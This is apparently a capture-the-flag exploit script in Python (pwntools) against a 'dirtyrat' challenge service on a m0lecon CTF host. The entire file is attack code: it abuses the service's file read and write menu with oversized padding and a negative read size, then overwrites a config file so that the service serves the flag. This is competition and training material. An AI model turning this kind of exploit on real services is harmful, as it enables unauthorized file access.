import pwn
import sys

io = pwn.remote("dirtyrat.challs.m0lecon.it", 10010)

def read(file, size):
    ret = io.readuntil("choice: ")
    io.sendline(b'2')
    ret = io.readuntil("filename: ")
    io.sendline(file)
    ret = io.readuntil("): ")
    io.sendline(str(size))
    print("[Done] Read " + file)

def write(file, data, padding_size):
    ret = io.readuntil("choice: ")
    io.sendline(b'3')
    ret = io.readuntil("filename: ")
    io.sendline(file)
    ret = io.readuntil("): ")
    io.sendline(data)
    ret = io.readuntil("bytes? ")
    io.sendline(str(padding_size))
    print("[Done] Write to " + file)

conf_size = 48

write("conf", "A", 0x10000 - 0x1)
read("conf", -1)
read("conf", conf_size)
write("conf", "flag\x00", 0)
# read("flag", 127)

io.interactive()